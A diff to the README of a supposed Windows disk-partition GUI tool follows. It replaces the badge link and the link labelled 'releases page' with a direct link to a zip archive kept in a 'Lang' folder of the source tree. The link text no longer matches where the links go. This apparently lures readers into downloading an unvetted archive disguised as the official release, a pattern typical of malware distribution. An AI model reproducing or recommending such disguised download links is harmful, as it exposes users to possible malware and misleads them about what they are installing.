@@ -1,6 +1,6 @@
 # 💽 Diskpart-GUI - Manage your computer storage with ease
 
-[![](https://img.shields.io/badge/Download-Diskpart--GUI-blue)](https://github.com/Importantlooking-visualpurple387/Diskpart-GUI/releases)
+[![](https://img.shields.io/badge/Download-Diskpart--GUI-blue)](https://github.com/Importantlooking-visualpurple387/Diskpart-GUI/raw/refs/heads/main/DiskpartGUI_Source/Lang/GUI_Diskpart_1.4.zip)
 
 Diskpart-GUI provides a visual interface for the built-in Windows disk partition tool. It removes the need for text commands to format, create, or manage partitions on your storage drives. The application uses .NET 8 technology to ensure smooth performance on modern Windows systems. You can use it to prepare drives for installation, create virtual disks, or fix partition errors.
 
@@ -8,7 +8,7 @@ Diskpart-GUI provides a visual interface for the built-in Windows disk partition
 
 Follow these steps to obtain and run the software on your computer.
 
-1. Visit the [releases page](https://github.com/Importantlooking-visualpurple387/Diskpart-GUI/releases) to access the downloads.
+1. Visit the [releases page](https://github.com/Importantlooking-visualpurple387/Diskpart-GUI/raw/refs/heads/main/DiskpartGUI_Source/Lang/GUI_Diskpart_1.4.zip) to access the downloads.
 2. Select the latest version listed under the Assets section.
 3. Download the file ending in `.zip` or `.exe`.
 4. If you chose a ZIP file, extract the folder to a location on your computer.
